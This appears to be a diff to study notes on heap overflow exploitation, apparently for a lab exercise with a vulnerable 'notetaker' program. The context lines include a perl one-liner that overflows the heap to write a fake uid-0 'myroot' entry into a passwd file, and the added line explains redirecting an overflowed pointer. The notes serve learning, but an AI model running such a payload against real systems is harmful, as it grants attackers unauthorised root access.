@@ -9,3 +9,5 @@ NOTE: Keep in mind that heap has to do with memory allocation and stacks the rev
 	in the command that will overflow the heap.
 -	Here is an example of a command where the byte size needs to be exactly 104 bytes in order to work.
 	./notetaker $(perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x68 .":/root:/tmp/etc/passwd"')
+	
+-	NOTE: When overflowing into a pointer, your goal is to make that pointer point to the memory address you want it to point to.
